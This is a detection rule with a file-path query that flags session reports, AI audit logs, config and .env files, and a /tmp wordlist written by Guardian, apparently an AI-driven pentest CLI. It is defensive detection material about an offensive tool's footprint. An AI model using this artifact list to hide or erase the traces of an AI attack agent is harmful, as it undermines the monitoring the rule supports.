Detects files Guardian (zakirkun/guardian-cli), an AI pentest CLI, writes on the host that runs it. In its
working folder: reports/session_<yyyymmdd_HHMMSS>.json (the whole engagement: target, tool commands and output,
findings, model decisions and token costs), written through a temporary reports/.session_<id>_*.tmp, reports
report_<id>.md/.html/.json/.sarif, screenshots under reports/screenshots/<stamp>/, and logs/guardian.log with
logs/ai_audit.log (one JSON record per model decision). In the user's home: ~/.guardian/guardian.yaml and
~/.guardian/.env (written by "guardian init" with GOOGLE_API_KEY), ~/.guardian/kb/kb.sqlite3 and
~/.guardian/ranker.pkl. The ffuf fallback wordlist goes to /tmp/guardian_ffuf_wordlist.txt. The reports and logs
paths come from config/guardian.yaml and can be changed; the file names cannot.
false_positives: Authorized tests with Guardian
Other software that writes logs/ai_audit.log or reports/session_*.json in its working folder
name: Guardian Session, Log or Configuration Files Written
query: (TargetFilename:(*\/.guardian\/guardian.yaml OR *\/.guardian\/.env OR *\/.guardian\/kb\/kb.sqlite3 OR *\/.guardian\/ranker.pkl OR *\/tmp\/guardian_ffuf_wordlist.txt)) OR TargetFilename:*\/logs\/ai_audit.log OR ((TargetFilename:(*\/reports\/session_* OR *\/reports\/.session_*)) AND (TargetFilename:(*.json OR *.tmp)))
